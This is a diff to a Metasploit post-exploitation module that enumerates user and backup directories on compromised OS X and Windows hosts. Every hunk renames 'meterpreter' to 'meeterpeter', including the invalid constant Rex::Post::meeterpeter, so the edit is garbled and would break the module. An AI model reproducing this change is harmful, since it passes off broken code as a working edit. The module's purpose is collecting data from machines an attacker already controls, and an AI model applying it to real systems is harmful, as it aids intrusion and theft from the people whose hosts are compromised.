@@ -21,7 +21,7 @@ class Metasploit3 < Msf::Post
           'bannedit' # Based on bannedit's pidgin_cred module structure
         ],
       'Platform'       => %w{ osx win },
-      'SessionTypes'   => ['meterpreter', 'shell']
+      'SessionTypes'   => ['meeterpeter', 'shell']
     ))
     register_options(
       [
@@ -54,8 +54,8 @@ class Metasploit3 < Msf::Post
         @users = drive + '\\Documents and Settings'
       end
 
-      if session.type != "meterpreter"
-        print_error "Only meterpreter sessions are supported on windows hosts"
+      if session.type != "meeterpeter"
+        print_error "Only meeterpeter sessions are supported on windows hosts"
         return
       end
       paths = enum_users_windows
@@ -129,7 +129,7 @@ class Metasploit3 < Msf::Post
           dirs = check_for_backups_win(bdir)
           dirs.each { |dir| paths << dir } if dirs
         end
-      rescue ::Rex::Post::Meterpreter::RequestError
+      rescue ::Rex::Post::meeterpeter::RequestError
         # Handle the case of the @users base directory is not accessible
       end
     else
@@ -151,7 +151,7 @@ class Metasploit3 < Msf::Post
           dirs << "#{bdir}\\#{dir}"
         end
       end
-    rescue Rex::Post::Meterpreter::RequestError
+    rescue Rex::Post::meeterpeter::RequestError
       # Handle base directories that do not exist
     end
     dirs
